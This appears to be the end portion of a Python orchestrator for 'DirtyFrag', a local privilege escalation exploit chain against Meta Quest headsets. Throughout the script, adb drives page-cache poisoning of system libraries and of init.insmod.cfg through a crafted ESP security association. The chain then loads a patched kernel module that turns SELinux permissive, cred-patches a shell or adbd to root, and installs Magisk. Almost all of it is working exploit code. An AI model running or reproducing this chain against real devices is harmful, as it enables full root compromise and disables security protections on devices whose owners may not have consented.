        banner("POST-EX  (root shell -> Magisk)")
        step("Staging post-ex assets (postex.sh, singularity_magisk.sh, singularity-Magisk.apk)")
        A = os.path.join(HERE, "postex", "assets")
        adb.push(os.path.join(HERE, "postex", "postex.sh"), "/data/local/tmp/postex.sh")
        for f in ("singularity_magisk.sh", "singularity-Magisk.apk"):
            adb.push(os.path.join(A, f), "/data/local/tmp/" + f)
        step("Releasing rooted shell -> postex.sh (drop_caches, rmmod, Magisk, setenforce 1)")
        wsh.release()
        for _ in range(90):
            if adb.sh("[ -f /data/local/tmp/postex_done ] && echo y") == "y": break
            time.sleep(2)
        wsh.stop()
        banner("POST-EX RESULT")
        print(adb.sh("cat /data/local/tmp/postex.log 2>/dev/null") or "(no log)")
        ge = adb.sh("getenforce")
        (win if ge == "Enforcing" else warn)(f"final getenforce={ge}  (Magisk policy live if Enforcing)")
    elif adb_root:
        banner("DONE  (adbd rooted + Permissive, NO Magisk)")
        win("adbd is uid0 + all caps + kernel context; SELinux left Permissive.")
        info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)")
        info("Existing shells stay uid2000; only shells forked AFTER the patch are root.")
        warn("residue (needs reboot): carrier page-cache poison + loaded carrier module (exit neutralized, rmmod-safe)")
    else:
        banner("DONE  (rooted + Permissive, code poisons reverted)")
        (wsh and wsh.stop())
        info("device is Permissive with a root-capable module loaded; run again with --postex/--adb-root.")
        warn("residue (needs reboot): carrier/cfg page-cache poison + loaded carrier module")

def require_toolchain():
    import shutil
    if os.path.isfile(CLANG) or shutil.which(CLANG): return   # only clang is needed to build
    err(f"clang not found: {CLANG}")
    warn("Install LLVM/clang and set AOSP_CLANG_BIN (or put it on PATH) — see SETUP.md:")
    warn("  Windows:  winget install LLVM.LLVM   then  set AOSP_CLANG_BIN=C:\\Program Files\\LLVM\\bin")
    warn("  Linux:    dnf/apt install clang llvm  (AOSP_CLANG_BIN=/usr/bin)")
    sys.exit(1)

def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=False):
    tgt = json.load(open(target_path))
    require_toolchain()          # fail fast with a clear message before staging anything
    if tgt["kernel"].get("merged"):
        return run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk)
    tdir = os.path.join(HERE, "targets")
    os.makedirs(BUILD, exist_ok=True)
    banner(f"DIRTYFRAG-LPE   target: {tgt['name']}")
    info(tgt["description"])

    serial = pick_device(tgt, device_override); adb = ADB(serial)
    step("Preflight")
    dev_build = adb.getprop("ro.build.version.incremental")
    (ok if dev_build == tgt["device"]["build_incremental"] else warn)(f"device {serial}  build {dev_build}")
    before = adb.sh("getenforce")
    info(f"uid={adb.sh('id -u')}  getenforce={before}")
    if before != "Enforcing": warn(f"SELinux already {before} (expected Enforcing)")
    if not os.path.exists(DEX): err("e2e.dex missing (build Stager/Writer)"); sys.exit(1)
    adb.push(DEX, "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex")
    disable_phantom(adb)

    banner("BUILD  (host)")
    step("Carrier .ko  (48-byte diff-injection, enforcing=0)")
    carrier_out, carrier_want = build_carrier(tgt, tdir)
    carrier_cur = open(os.path.join(tdir, tgt["carrier"]["local_ko"]), "rb").read()
    ndiff = sum(1 for i in range(len(carrier_want)) if carrier_want[i] != carrier_cur[i])
    ok(f"carrier_patched.ko  ({ndiff} diff bytes,  anchor={tgt['kernel']['anchor_symbol']}, "
       f"delta={tgt['kernel']['delta_selinux_from_anchor']})")
    step("init.insmod.cfg  (+insmod line, modprobe kept)")
    cfg_cur, cfg_want = build_cfg(tgt, tdir)
    ok(f"cfg patched  ({sum(1 for i in range(len(cfg_want)) if cfg_want[i]!=cfg_cur[i])} diff bytes)")

    banner("STAGE  (shell: Dirty-Frag SA)")
    stager = Stager(serial)
    step("Staging attacker-keyed AES-GCM ESP SA (spi 0xdeadbe10)")
    port = stager.start()
    if not port: err("stager failed (stale SA? reboot to clear xfrm)"); stager.stop(); sys.exit(1)
    ok(f"SA live, encap port {port}  (held by background stager)")

    eva_stub_len = 0; orig_las = b""
    try:
        banner("POISON  (shell -> page caches)")
        step("inject-lib stub  (init_array[0] -> 2-file poison stub in the gap)")
        eva_raw, eva_spec, cnts = build_inject_stub(tgt, port,
            [(tgt["carrier"]["device_path"], carrier_cur, carrier_want),
             (tgt["cfg"]["device_path"], cfg_cur, cfg_want)])
        eva_stub_len = len(eva_raw)
        info(f"stub {len(eva_raw)}B  (carrier IVs={cnts[0]}, cfg IVs={cnts[1]})  gap fits {inj(tgt)['stub_gap_size']}B")
        poison(adb, inj(tgt)["device_path"], eva_spec, "inject")
        step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)")
        las_raw, las_spec = build_libas_stub(tgt)
        orig_las = adb.read_region(tgt["libandroid_servers"]["device_path"],
                                   hx(tgt["libandroid_servers"]["dump_off"]), len(las_raw))  # save for restore
        poison(adb, tgt["libandroid_servers"]["device_path"], las_spec, "libas")

        banner("TRIGGER  (shell)")
        tsvc = tgt["services"]["tracking"]; isvc = tgt["services"]["insmod_sh"]
        step(f"dumpsys input  ->  system_server restarts {tsvc}  ->  ctor poisons carrier + cfg")
        pid0 = adb.sh(f"pidof {tsvc}")
        adb.sh("dumpsys input >/dev/null 2>&1")
        pid1 = pid0
        for _ in range(20):
            time.sleep(1); pid1 = adb.sh(f"pidof {tsvc}")
            if pid1 and pid1 != pid0: break
        if pid1 == pid0 or not pid1:
            err(f"{tsvc} did not restart (pid still {pid0}) — dump stub not hit"); return
        ok(f"{tsvc} restarted  pid {pid0} -> {pid1}")
        # settle: the init_array ctor runs at process init and poisons carrier+cfg via the SA;
        # wait it out before finit (re-triggering would REVERT the poison, so no retry).
        info(f"settling {settle}s for the ctor's carrier/cfg poison to complete")
        time.sleep(settle)
        if verify_root:
            csha = adb.su(f"sha1sum {tgt['carrier']['device_path']}").split()[0]
            info(f"carrier page-cache sha (root check): {csha[:12]}…")
        if adb.sh(f"lsmod | grep -c llcc_perfmon") != "0":
            warn("carrier already loaded before finit — original may have raced in; reboot & retry")
        step(f"setprop ctl.start {isvc}  ->  init finit_modules the poisoned carrier")
        adb.sh(f"setprop ctl.start {isvc}"); time.sleep(4)

        banner("VERIFY")
        after = adb.sh("getenforce")
        if after == "Permissive":
            win(f"SELinux {before} -> {after}   (from uid={adb.sh('id -u')} shell, zero root)")
            if verify_root:
                info("module: " + (adb.su("lsmod | grep llcc_perfmon") or "(not listed)"))
        else:
            err(f"getenforce={after} (expected Permissive) — chain did not complete")
    finally:
        stager.stop(); ok("stager stopped (SA reaped)")

    if cleanup == "reboot":
        banner("RESTORE  (reboot)")
        step("setenforce 1; rmmod; reboot (clears all page-cache poison + xfrm)")
        adb.su("setenforce 1; rmmod llcc_perfmon")
        subprocess.run(["adb", "-s", serial, "reboot"])
        subprocess.run(["adb", "-s", serial, "wait-for-device"])
        for _ in range(40):
            if adb.getprop("sys.boot_completed") == "1": break
            time.sleep(3)
        ge = adb.sh("getenforce")
        (ok if ge == "Enforcing" else warn)(f"post-reboot getenforce={ge}")

    elif cleanup == "leave-disabled":
        banner("CLEANUP  (leave SELinux disabled, no reboot)")
        step("Revert the code-injection poisons via shell (no root, no reboot)")
        poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
        info("libeva: init_array[0] -> orig ctor, stub gap zeroed (future tracking restarts are clean)")
        if orig_las:
            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
            info("libandroid_servers::dump restored (dumpsys input no longer restarts trackingservice)")
        ge = adb.sh("getenforce")
        (win if ge == "Permissive" else warn)(f"getenforce={ge}  — code poisons reverted, NO reboot")
        warn("residue (benign, needs root/reboot): carrier/cfg page-cache poison + loaded llcc_perfmon")
        info("READY FOR POST-EX: run  orchestrate.py --postex  (usbip-vudc cred-patch -> Singularity Magisk)")
        info("  drop_caches (evict carrier/cfg) + rmmod llcc_perfmon + setenforce 1 (re-enable, magisk policy live)")
    elif cleanup == "postex":
        banner("POST-EX  (root via insmod_sh -> Magisk)")
        if adb.sh("getenforce") != "Permissive":
            err("not permissive — base chain failed; aborting post-ex"); return
        k = tgt["kernel"]; ppath = "/data/local/tmp/uv.ko"
        # 0) revert the code-injection poisons (libeva ctor + libandroid dump) so trackingservice /
        #    system_server are clean before Magisk restarts zygote
        step("Reverting code-injection poisons (libeva/libandroid) via shell")
        poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
        if orig_las:
            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
        # 1) waiting shell to be cred-patched
        step("Launching waiting shell (to be cred-patched to uid 0)")
        cmods = " ".join(dict.fromkeys(
            os.path.basename(tgt[c]["device_path"])[:-3].replace("-", "_")
            for c in ("cred_carrier", "carrier") if c in tgt))
        wsh = WaitShell(serial, skip_magisk, cmods); pid = wsh.start()
        if not pid: err("waiting shell failed"); return
        ok(f"waiting shell pid {pid}")
        # 2) build the diff-patched cred carrier (usbip-vudc) for this pid + push to shell-writable dir
        step("Diff-patching cred carrier (usbip-vudc: enforcing=0 + cred-patch, anchor-relative)")
        credko = os.path.join(BUILD, "uv.ko")
        cc = os.path.join(tdir, tgt["cred_carrier"]["local_ko"])
        r = subprocess.run([sys.executable, os.path.join(HERE, "build_credmod.py"), cc, credko,
                            k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"],
                            k["delta_pidtask_from_anchor"], str(pid), k["delta_ssuse_from_anchor"]],
                           capture_output=True, text=True)
        if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); wsh.stop(); return
        info(r.stdout.strip().split(": ",1)[-1])
        adb.push(credko, ppath)
        # 3) stage post-ex assets (root shell will run these)
        step("Staging post-ex assets (postex.sh, singularity_magisk.sh, singularity-Magisk.apk)")
        A = os.path.join(HERE, "postex", "assets")
        adb.push(os.path.join(HERE, "postex", "postex.sh"), "/data/local/tmp/postex.sh")
        for f in ("singularity_magisk.sh", "singularity-Magisk.apk"):
            adb.push(os.path.join(A, f), "/data/local/tmp/" + f)
        # 4) shell poisons cfg -> insmod uv.ko  (permissive: shell reads vendor cfg by DAC)
        step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)")
        _, cfg_want = build_cfg(tgt, tdir, insmod_path=ppath)
        off = hx(tgt["cfg"]["inject_off"]); ln = tgt["cfg"]["inject_len"]
        spec = bytearray()
        for i in range(off, off + ln): spec += struct.pack("<I", i) + bytes([cfg_want[i]])
        poison(adb, tgt["cfg"]["device_path"], bytes(spec), "cfg_pe")
        # 5) trigger: insmod_sh loads uv.ko -> cred-patches the waiting shell to root
        step("ctl.start insmod_sh -> loads uv.ko -> cred-patch waiting shell to uid 0")
        adb.sh("setprop ctl.start insmod_sh")
        rooted = False; uline = ""
        for _ in range(20):   # poll until the waiting shell's creds are actually patched
            time.sleep(1)
            uline = adb.sh(f"grep -m1 Uid /proc/{wsh.pid}/status 2>/dev/null")
            if uline.split()[1:2] == ["0"]: rooted = True; break
        if not rooted:
            err(f"waiting shell not rooted (uv.ko load failed?) — {uline or 'no Uid line'}"); wsh.stop(); return
        ok(f"waiting shell {wsh.pid} cred-patched -> uid 0")
        # 6) release the (now-root) waiting shell -> runs postex.sh
        step("Releasing rooted shell -> postex.sh (drop_caches, rmmod, Magisk, setenforce 1)")
        wsh.release()
        for _ in range(90):   # Singularity Magisk setup (no zygote restart)
            if adb.sh("[ -f /data/local/tmp/postex_done ] && echo y") == "y": break
            time.sleep(2)
        wsh.stop()
        banner("POST-EX RESULT")
        print(adb.sh("cat /data/local/tmp/postex.log 2>/dev/null") or "(no log)")
        ge = adb.sh("getenforce")
        (win if ge == "Enforcing" else warn)(f"final getenforce={ge}  (Magisk policy live if Enforcing)")
    elif cleanup == "adb-root":
        banner("ADB-ROOT  (cred-patch adbd -> root adb shells, no Magisk)")
        if adb.sh("getenforce") != "Permissive":
            err("not permissive — base chain failed; aborting adb-root"); return
        # revert the code-injection poisons (clean trackingservice / system_server)
        step("Reverting code-injection poisons (inject-lib/libandroid) via shell")
        poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
        if orig_las:
            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
        pid = adbd_pid(adb)
        if not pid: err("could not find adbd pid"); return
        cc = os.path.join(tdir, tgt["cred_carrier"]["local_ko"]); credko = os.path.join(BUILD, "uv.ko")
        ppath = "/data/local/tmp/uv.ko"
        step(f"Diff-patching cred carrier ({os.path.basename(cc)}) -> adbd pid {pid} + uid0 + caps + kernel ctx")
        r = subprocess.run(credmod_args(tgt, cc, pid, credko, ctx=True), capture_output=True, text=True)
        if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); return
        info(r.stdout.strip().split(": ", 1)[-1]); adb.push(credko, ppath)
        step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)")
        _, cfg_want = build_cfg(tgt, tdir, insmod_path=ppath)
        off = hx(tgt["cfg"]["inject_off"]); ln = tgt["cfg"]["inject_len"]
        spec = bytearray()
        for i in range(off, off + ln): spec += struct.pack("<I", i) + bytes([cfg_want[i]])
        poison(adb, tgt["cfg"]["device_path"], bytes(spec), "cfg_pe")
        step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd")
        adb.sh("setprop ctl.start insmod_sh")
        rooted = False
        for _ in range(20):
            time.sleep(1)
            if adb.sh("id -u") == "0": rooted = True; break
        if not rooted: err("adb shell not root (uv.ko load failed?)"); return
        win(f"adbd (pid {pid}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context")
        info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)")
        info("Existing shells stay uid2000; only shells forked AFTER the patch are root. SELinux left Permissive.")
        warn("residue (needs reboot): carrier/cfg page-cache poison + loaded modules (exit neutralized, rmmod-safe)")
    else:
        warn("--no-restore: device left fully poisoned & permissive")

def main():
    ap = argparse.ArgumentParser(description="DirtyFrag LPE orchestrator (Quest 3 + Quest Pro; target-driven)")
    ap.add_argument("-t", "--target", required=True, help="targets/<name>.json")
    ap.add_argument("-d", "--device", help="adb serial (default: match target build)")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--no-restore", action="store_true", help="leave device fully poisoned & permissive")
    g.add_argument("--leave-disabled", action="store_true",
                   help="revert code-injection poisons (shell, no reboot) but keep SELinux Permissive — for post-ex")
    g.add_argument("--postex", action="store_true",
                   help="after Permissive: root via insmod_sh(usbip-vudc cred-patch) -> Singularity Magisk -> setenforce 1")
    g.add_argument("--adb-root", action="store_true",
                   help="no Magisk: cred-patch adbd to uid0 + all caps + kernel SELinux context, leave "
                        "SELinux Permissive -> every NEW `adb shell` is full root (to isolate Magisk issues)")
    ap.add_argument("--skip-magisk", action="store_true", help="post-ex without the Magisk step (root + rmmod + setenforce only)")
    ap.add_argument("--verify-root", action="store_true", help="use su to confirm poison/module (validation only)")
    ap.add_argument("--settle", type=int, default=8, help="seconds to let the ctor finish poisoning after restart (default 8)")
    a = ap.parse_args()
    cleanup = ("postex" if a.postex else "adb-root" if a.adb_root else "leave-disabled" if a.leave_disabled
               else "none" if a.no_restore else "reboot")
    try:
        run(a.target, a.device, cleanup, a.verify_root, a.settle, a.skip_magisk)
    except KeyboardInterrupt:
        err("interrupted")

if __name__ == "__main__":
    main()
